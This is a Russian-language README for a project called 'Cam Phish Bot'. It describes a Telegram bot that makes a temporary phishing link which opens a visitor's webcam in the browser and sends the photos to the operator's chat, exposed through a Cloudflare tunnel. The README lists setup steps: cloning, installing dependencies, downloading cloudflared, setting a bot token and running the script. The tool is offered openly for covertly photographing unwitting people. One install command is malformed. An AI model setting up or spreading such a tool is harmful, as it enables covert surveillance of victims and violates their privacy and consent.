# Cam Phish Bot

Этот проект представляет собой Telegram-бота, который создает временную ссылку, открывающую веб-камеру пользователя и отправляющую фото в чат бота.

## 🚀 Функции

- Генерация уникальной ссылки для камеры
- Получение фото через браузер
- Отправка фото в Telegram-чат
- Использование Cloudflare Tunnel для публичного доступа

## 📌 Установка

### 1. Установите Python (если не установлен)

Скачайте и установите Python с [официального сайта](https://www.python.org/downloads/).

### 2. Склонируйте репозиторий | Откройте CMD 

```sh
git clone https://github.com/magus24/PhishCamMAGUS.git
cd PhishCamMAGUS
```

### 3. Установите зависимости

```sh
pip install requirements.txt
```

### 4. Установите `cloudflared`

Скачайте `cloudflared` и добавьте его в `PATH`:

```sh
curl -LO https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-windows-amd64.exe
move cloudflared-stable-windows-amd64.exe C:\Users\User\Downloads\cloudflared.exe
setx PATH "%PATH%;C:\Users\User\Downloads"

```

### 5. Запустите бота

```sh
python PhishCam.py
```

## ⚙️ Настройка | Важно !

Перед запуском измените переменную `BOT_TOKEN` в `PhishCam.py` на свой Telegram Bot Token.

---

Создатель: MAGUS  @gMAGUSg {TG}

